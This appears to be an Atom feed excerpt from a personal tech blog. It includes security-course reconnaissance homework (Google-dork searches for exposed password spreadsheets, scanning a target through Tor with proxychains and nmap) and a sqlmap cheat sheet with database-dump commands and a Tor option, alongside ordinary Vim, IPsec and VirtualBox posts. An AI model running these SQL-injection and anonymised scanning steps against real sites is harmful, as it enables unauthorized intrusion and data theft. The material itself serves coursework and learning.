&lt;li&gt;&lt;a href="https://www.facebook.com/JohnnyDepOfficial"&gt;https://www.facebook.com/JohnnyDepOfficial&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 14" src="/files/intro-compsec-hw1/screenshot14.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.reunion.com/johnnydepp/"&gt;http://www.reunion.com/johnnydepp/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 15" src="/files/intro-compsec-hw1/screenshot15.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mylife.com/mick563"&gt;http://www.mylife.com/mick563&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 16" src="/files/intro-compsec-hw1/screenshot16.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/J0HNNYDepp"&gt;https://twitter.com/J0HNNYDepp&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 17" src="/files/intro-compsec-hw1/screenshot17.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google “XYZ resume firewall” and “XYZ resume intrusion detection” where “XYZ” is the name of your target company.  Screen dump “useful” results and explain what you got.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 18" src="/files/intro-compsec-hw1/screenshot18.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Screenshot 19" src="/files/intro-compsec-hw1/screenshot19.png" /&gt;  &lt;ul&gt;
&lt;li&gt;A company called "Systems Technology International" is looking for who will use Linux iptables firewall.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img alt="Screenshot 20" src="/files/intro-compsec-hw1/screenshot20.png" /&gt;  &lt;ul&gt;
&lt;li&gt;A company called "ICF International" is looking for who have experience with using Snort IDS.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Lookup Archive.org and Google cached results, and select a target web site. Compare the differences between an archived and cached copy with its current on-line web site. Give screen dump and explain the differences.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;Archive.org  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 21" src="/files/intro-compsec-hw1/screenshot21.png" /&gt;  &lt;/li&gt;
&lt;li&gt;2014/02/09  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google cached  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 22" src="/files/intro-compsec-hw1/screenshot22.png" /&gt;  &lt;/li&gt;
&lt;li&gt;2014/04/07 01:16:27 GMT  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;current  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 23" src="/files/intro-compsec-hw1/screenshot23.png" /&gt;  &lt;/li&gt;
&lt;li&gt;2014/04/07 09:00:03 GMT  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Archive.org have older information. Google cached seems no different from the current website because the cached information just few hours ago.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Find Google Hacking Database at hackersforcharity.org/ghdb/. Summarize what it has and select 3 strings to search. Screen dump and explain what you got.  &lt;ul&gt;
&lt;li&gt;What GHDB has  &lt;ul&gt;
&lt;li&gt;it store the google search sentences which can be used to search some specific websites vulnerabilities. There are many entries and each entry have many google search sentences for searching vulnerabilities. The information on the GHDB maybe too old. The newest record is almost eight years ago (2006), though it seems still working...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanation  &lt;ul&gt;
&lt;li&gt;Juicy information of the websites built by AppServ  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 24" src="/files/intro-compsec-hw1/screenshot24.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Screenshot 25" src="/files/intro-compsec-hw1/screenshot25.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;.xls files within user id and password  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 26" src="/files/intro-compsec-hw1/screenshot26.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Screenshot 27" src="/files/intro-compsec-hw1/screenshot27.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;backup directories of the server  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 28" src="/files/intro-compsec-hw1/screenshot28.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Screenshot 29" src="/files/intro-compsec-hw1/screenshot29.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Select a web site. Start from whois.iana.org to find its registry, registrar, and registrant. Also select an IP address. Start from arin.net to find who owns the IP address. Show your screen dump and explain.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;whois.iana.org - www.nctu.edu.tw  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 30" src="/files/intro-compsec-hw1/screenshot30.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Screenshot 31" src="/files/intro-compsec-hw1/screenshot31.png" /&gt;  &lt;/li&gt;
&lt;li&gt;Registry: Taiwan Network Information Center (TWNIC)  &lt;/li&gt;
&lt;li&gt;Registrar: rs.twnic.net.tw  &lt;/li&gt;
&lt;li&gt;Registrant: Vice CEO  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;arin.net - 8.8.8.8  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 32" src="/files/intro-compsec-hw1/screenshot32.png" /&gt;  &lt;/li&gt;
&lt;li&gt;8.8.8.8 is Google DNS Server  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Select a domain name. Use nslookup to dump its DNS records. Show your screen dump and explain.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 33" src="/files/intro-compsec-hw1/screenshot33.png" /&gt;  &lt;/li&gt;
&lt;li&gt;The &lt;a href="http://www.nctu.edu.tw"&gt;http://www.nctu.edu.tw&lt;/a&gt; has three IP for load balancing.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Select a domain name. Use traceroute or similar tools to find the access path to that domain. Show your screen dump and explain.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 34" src="/files/intro-compsec-hw1/screenshot34.png" /&gt;  &lt;/li&gt;
&lt;li&gt;The destination server seems close the ICMP, so traceroute didn't get the 5th hop ICMP "time exceeded" signal.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Follow the case study right before chapter 1. Select one target and run through all tools (Tor, Vidalia, Privoxy, tor-resolve, proxychains, Nmap, socat, nc). Screen dump the process and explain what you got in your screen.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;turn on vidalia  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 35" src="/files/intro-compsec-hw1/screenshot35.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;using tor  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 36" src="/files/intro-compsec-hw1/screenshot36.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;finding target  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 37" src="/files/intro-compsec-hw1/screenshot37.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;found target  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 38" src="/files/intro-compsec-hw1/screenshot38.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;used tor-resolve to get target ip  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 39" src="/files/intro-compsec-hw1/screenshot39.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;using proxychains and nmap  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 40" src="/files/intro-compsec-hw1/screenshot40.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Screenshot 41" src="/files/intro-compsec-hw1/screenshot41.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;using socat  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 42" src="/files/intro-compsec-hw1/screenshot42.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;get target informations  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 43" src="/files/intro-compsec-hw1/screenshot43.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary><category term="Security"></category></entry><entry><title>Converting tabs to spaces in Vim</title><link href="https://blog.m157q.tw/posts/2014/12/09/converting-tabs-to-spaces-in-vim/" rel="alternate"></link><published>2015-10-28T13:41:00+08:00</published><updated>2015-10-28T13:41:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-09:posts/2014/12/09/converting-tabs-to-spaces-in-vim/</id><summary type="html">&lt;h2&gt;Convert tabs to spaces&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;retab&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Set the 1 tab to be expanded to 4 spaces&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;tabstop&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="nb"&gt;shiftwidth&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="nb"&gt;expandtab&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Comments below have some useful tips for some specail cases (like Makefile)&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Comment 1" src="/files/converting-tabs-to-spaces-in-vim/comments_1.png" /&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Comment 2" src="/files/converting-tabs-to-spaces-in-vim/comments_2.png" /&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Comment 3" src="/files/converting-tabs-to-spaces-in-vim/comments_3.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://vim.wikia.com/wiki/Converting_tabs_to_spaces"&gt;Converting tabs to spaces - Vim Tips Wiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="Vim"></category><category term="Makefile"></category></entry><entry><title>Network Security Second Midterm</title><link href="https://blog.m157q.tw/posts/2014/12/08/network-security-second-midterm/" rel="alternate"></link><published>2014-12-08T09:56:00+08:00</published><updated>2014-12-08T09:56:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-08:posts/2014/12/08/network-security-second-midterm/</id><summary type="html">&lt;p&gt;Find the answers for the questions I am not sure about.  &lt;/p&gt;
&lt;h3&gt;Q: Is it correct that a certificate contains both the public key and private key of a user? Who should sign a certificate? why?&lt;/h3&gt;
&lt;h3&gt;A: No, only the public key. The trusted Third Party (usually CA) should sign a certificate in order to let anyone needing this user’s public key can obtain the certificate and verify that it is valid by way of the attached trusted signature.&lt;/h3&gt;
&lt;p&gt;&lt;img alt="1.png" src="/files/network-security-second-midterm/1.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Q: What is 802.11i?&lt;/h3&gt;
&lt;h3&gt;A: 802.11i is a standard for wireless local area networks (WLANs) that provides improved encryption for networks that use the popular 802.11a and 802.11b (which includes Wi-Fi standards).&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/IEEE_802.11i-2004"&gt;IEEE 802.11i-2004 - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://searchmobilecomputing.techtarget.com/definition/80211i"&gt;What is 802.11i? - Definition from WhatIs.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="2.png" src="/files/network-security-second-midterm/2.png" /&gt;&lt;br /&gt;
&lt;img alt="3.png" src="/files/netowrk-security-second-midterm/3.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;IPsec&lt;/h2&gt;
&lt;p&gt;Check links below for the detail.&lt;br /&gt;
+ &lt;a href="https://tools.ietf.org/html/rfc4301"&gt;RFC 4301 - Security Architecture for the Internet Protocol&lt;/a&gt;&lt;br /&gt;
+ &lt;a href="http://en.wikipedia.org/wiki/IPsec"&gt;IPsec - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Q: In IPsec, explain security association (SA) and who may keep it?&lt;/h3&gt;
&lt;h3&gt;A: An SA is a simplex "connection" that affords security services to the traffic carried by it. (RFC-4301 4.1)&lt;/h3&gt;
&lt;h3&gt;Both client &amp;amp; server will keep it.&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Security_association"&gt;Security association - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;A Security Association (SA) is the establishment of shared security attributes between two network entities to support secure communication.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;An SA is a simplex (one-way channel) and logical connection which endorses and provides a secure data connection between the network devices.  &lt;/li&gt;
&lt;li&gt;An SA is a logical group of security parameters that enable the sharing of information to another entity.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Q: In IPsec, explain security association database (SAD) and who may keep it?&lt;/h3&gt;
&lt;h3&gt;A: In each IPsec implementation, there is a nominal Security Association Database (SAD), in which each entry defines the parameters associated with one SA.  Each SA has an entry in the SAD. (RFC-4301 4.4.2)&lt;/h3&gt;
&lt;h3&gt;Both client &amp;amp; server will keep it.&lt;/h3&gt;
&lt;p&gt;&lt;img alt="4.png" src="/files/network-security-second-midterm/4.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Q: In IPsec, if ESP and AH support authentication? confidentiality?&lt;/h3&gt;
&lt;h3&gt;A: AH support authentication; ESP support authentication and cofidentiality;&lt;/h3&gt;
&lt;p&gt;&lt;img alt="5.png" src="/files/network-security-second-midterm/5.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Q: IPsec Modes detail&lt;/h3&gt;
&lt;h3&gt;A: Transport mode and Tunnel Mode&lt;/h3&gt;
&lt;p&gt;&lt;img alt="6.png" src="/files/network-security-second-midterm/6.png" /&gt;&lt;br /&gt;
&lt;img alt="7.png" src="/files/network-security-second-midterm/7.png" /&gt;&lt;br /&gt;
&lt;img alt="8.png" src="/files/network-security-second-midterm/8.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Q: IPsec Header&lt;/h3&gt;
&lt;h3&gt;ESP Encryption and Authentication&lt;/h3&gt;
&lt;p&gt;&lt;img alt="9.png" src="/files/network-security-second-midterm/9.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;ESP Transport mode &amp;amp; Tunnel mode&lt;/h3&gt;
&lt;p&gt;&lt;img alt="10.png" src="/files/network-security-second-midterm/10.png" /&gt;  &lt;/p&gt;</summary><category term="NetSec"></category><category term="Security"></category></entry><entry><title>percol - interactive pipe in shell</title><link href="https://blog.m157q.tw/posts/2014/12/04/percol-interactive-pipe-in-shell/" rel="alternate"></link><published>2015-10-28T13:48:00+08:00</published><updated>2015-10-28T13:48:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-04:posts/2014/12/04/percol-interactive-pipe-in-shell/</id><summary type="html">&lt;h2&gt;&lt;a href="https://github.com/mooz/percol"&gt;mooz/percol · GitHub&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Just like &lt;code&gt;less&lt;/code&gt; + &lt;code&gt;grep&lt;/code&gt; (in time) + &lt;code&gt;echo&lt;/code&gt; (the result) to me.&lt;br /&gt;
But the instant query filter maybe useful in some cases.  &lt;/p&gt;
&lt;h3&gt;Installation&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pip2 install percol  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Examples&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ percol $file&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ ps aux | percol&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ git checkout $(git branch | percol)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="percol"></category><category term="Python"></category><category term="pip"></category></entry><entry><title>Boot LiveUSB in VirtualBox 4.3.18</title><link href="https://blog.m157q.tw/posts/2014/12/04/boot-liveusb-in-virtualbox-4-3-18/" rel="alternate"></link><published>2015-10-28T14:36:00+08:00</published><updated>2015-10-28T14:36:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-04:posts/2014/12/04/boot-liveusb-in-virtualbox-4-3-18/</id><summary type="html">&lt;h2&gt;Steps&lt;/h2&gt;
&lt;h3&gt;1.&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo chown m157q /dev/disk1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;2.&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ VBoxManage internalcommands createrawvmdk -filename ~/VirtualBox&lt;span class="se"&gt;\ &lt;/span&gt;VMs/win7_test.vmdk -rawdisk /dev/disk1  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3.&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Create New Machine in VirtualBox and select the generated .vmdk file as the hard drive.  &lt;ul&gt;
&lt;li&gt;Use an existing virtual hard drive file while addding the Hard drive.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;4.&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Boot the virtual machine.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.xuite.net/yh96301/blog/64131045-VirtualBox+4.3.4%E4%BD%BF%E7%94%A8USB%E9%9A%A8%E8%BA%AB%E7%A2%9F%E9%96%8B%E6%A9%9F"&gt;VirtualBox 4.3.4使用USB隨身碟開機 @ 軟體使用教學 :: 隨意窩 Xuite日誌&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://gordon168.tw/?p=324"&gt;VirtualBox設定由USB隨身碟開機 « 高登工作室&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://forums.virtualbox.org/viewtopic.php?t=9223"&gt;virtualbox.org • View topic - Using a raw hard disk on Mac OS X&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://forums.virtualbox.org/viewtopic.php?f=8&amp;amp;p=99406"&gt;virtualbox.org • View topic - VERR_ACCESS_DENIED&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="VirtualBox"></category><category term="LiveUSB"></category><category term="sysadmin"></category></entry><entry><title>sqlmap Cheat Sheet</title><link href="https://blog.m157q.tw/posts/2014/12/01/sqlmap-cheat-sheet/" rel="alternate"></link><published>2014-12-01T05:04:00+08:00</published><updated>2014-12-01T05:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-01:posts/2014/12/01/sqlmap-cheat-sheet/</id><summary type="html">&lt;h1&gt;Usage&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url} --dbs&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url} -D ${database} --tables&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url} -D ${database} -T ${table} --columns&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sqlmap -u ${url} -D ${database} -T ${table} -C ${col1},${col2} --dump&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Options&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--tor --tor-type=SOCKS5&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.nigesb.com/sqlmap-common-usage-and-examples.html"&gt;sqlmap注入常见用法一条龙&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage"&gt;sqlmap - Usage&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://oldmanlab.blogspot.tw/2012/03/sqlmap-tutorial-you-are-just.html"&gt;An Old man lab0ratory: Sqlmap tutorial - you are just unavoidable&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage"&gt;Usage · sqlmapproject/sqlmap Wiki · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="SQL Injection"></category><category term="sqlmap"></category><category term="Security"></category></entry><entry><title>Use find, grep, xargs to Rename Multiple Files</title><link href="https://blog.m157q.tw/posts/2014/11/10/use-find-grep-xargs-to-rename-multiple-files/" rel="alternate"></link><published>2015-10-28T13:51:00+08:00</published><updated>2015-10-28T13:51:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-10:posts/2014/11/10/use-find-grep-xargs-to-rename-multiple-files/</id><summary type="html">&lt;p&gt;Recursively find filenames ends up with &lt;code&gt;.vh&lt;/code&gt; from pwd directory and change their names from &lt;code&gt;*.vh&lt;/code&gt; to &lt;code&gt;*.vhd&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find &lt;span class="p"&gt;|&lt;/span&gt; grep .vh$ &lt;span class="p"&gt;|&lt;/span&gt; xargs -I &lt;span class="o"&gt;{}&lt;/span&gt;.vh mv &lt;span class="o"&gt;{}&lt;/span&gt;.vh &lt;span class="o"&gt;{}&lt;/span&gt;.vhd  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;This Only works with BSD &lt;code&gt;xargs&lt;/code&gt; !!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/10212192/how-to-grep-for-a-filename-instead-of-the-contents-of-a-file"&gt;http://stackoverflow.com/questions/10212192/how-to-grep-for-a-filename-instead-of-the-contents-of-a-file&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://viewsby.wordpress.com/2012/12/04/find-mvrename-with-xargs-example/"&gt;http://viewsby.wordpress.com/2012/12/04/find-mvrename-with-xargs-example/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="find"></category><category term="grep"></category><category term="xargs"></category><category term="mv"></category><category term="rename"></category></entry><entry><title>VirtualBox Guest additions upgrade: install_x11_startup_app: no script given</title><link href="https://blog.m157q.tw/posts/2014/11/10/virtualbox-guest-additions-upgrade-install_x11_startup_app-no-script-given/" rel="alternate"></link><published>2015-10-28T14:41:00+08:00</published><updated>2015-10-28T14:41:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-10:posts/2014/11/10/virtualbox-guest-additions-upgrade-install_x11_startup_app-no-script-given/</id><summary type="html">&lt;p&gt;I encountered this problem while I was doing the upgrade for the guest additions of VirtualBox.  &lt;/p&gt;
&lt;h3&gt;Guest OS: Ubuntu 14.04&lt;/h3&gt;
&lt;p&gt;Remove the following symlinks before you install the new version of the Guest addtions  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;# rm /usr/lib/x86_64-linux-gnu/VBoxGuestAdditions&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;# rm /usr/lib/VBoxGuestAdditions&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;# rm /usr/share/VBoxGuestAdditions&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://gallinar.blogspot.tw/2012/07/virtualbox-guest-additions-upgrade.html"&gt;A bozo's blog: VirtualBox Guest additions upgrade: install_x11_startup_app: no script given&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="VirtualBox"></category><category term="Guest Additions"></category><category term="install_x11_startup_app"></category><category term="sysadmin"></category></entry><entry><title>Embedded System Design</title><link href="https://blog.m157q.tw/posts/2014/11/06/embedded-system-design/" rel="alternate"></link><published>2014-11-06T01:27:00+08:00</published><updated>2014-11-06T01:27:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-06:posts/2014/11/06/embedded-system-design/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;School: NCTU  &lt;/li&gt;
&lt;li&gt;Semester: 【103 First semester】  &lt;/li&gt;
&lt;li&gt;Course No.: 5203  &lt;/li&gt;
&lt;li&gt;Course Name: Embedded System Design  &lt;/li&gt;
&lt;li&gt;Instructor: Prof. 曹孝櫟  &lt;/li&gt;
&lt;li&gt;Equipment: Xilinx &lt;a href="http://zedboard.org/"&gt;ZedBoard&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Note: &lt;a href="https://nctu_esd_2014_fall.hackpad.com/"&gt;https://nctu_esd_2014_fall.hackpad.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Xilinx"></category><category term="Zedboard"></category><category term="Embedded System"></category></entry><entry><title>Print pcap file in friendly format</title><link href="https://blog.m157q.tw/posts/2014/11/06/print-pcap-file-in-friendly-format/" rel="alternate"></link><published>2015-10-28T13:55:00+08:00</published><updated>2015-10-28T13:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-11-06:posts/2014/11/06/print-pcap-file-in-friendly-format/</id><summary type="html">&lt;h2&gt;Usage&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt; (GUI)  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.tcpdump.org/"&gt;tcpdump&lt;/a&gt; (CLI)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ tcpdump -qns 0 -X -r ${pcap_file}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ tcpdump -qns 0 -A -r ${pcap_file}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tcpick.sourceforge.net/"&gt;tcpick&lt;/a&gt; (CLI)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ tcpick -C -yP -r ${pcap_file}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tcpxtract.sourceforge.net/"&gt;tcpxtract&lt;/a&gt; (CLI)  &lt;ul&gt;
